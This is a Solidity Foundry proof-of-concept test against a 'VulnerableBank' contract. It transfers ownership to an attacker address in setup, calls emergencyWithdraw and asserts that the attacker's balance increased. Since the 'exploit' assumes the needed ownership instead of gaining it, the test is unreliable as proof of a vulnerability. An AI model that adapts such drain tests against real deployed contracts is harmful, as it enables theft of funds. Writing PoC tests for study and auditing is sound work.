// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./basetest.sol";
import "../src/49356772-e930-4cfa-8409-e51abe2c6e55_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
        // Step 2: Assume we already have the contract's ownership for this test
        target.transferOwnership(attacker); // Exploiting the assumption here
    }

    function testExploit() public balanceLog {
        uint256 initialAttackerBalance = attacker.balance;

        vm.prank(attacker);
        target.emergencyWithdraw();

        assertGt(attacker.balance, initialAttackerBalance, "Attacker's balance should have increased after emergencyWithdraw");
    }
}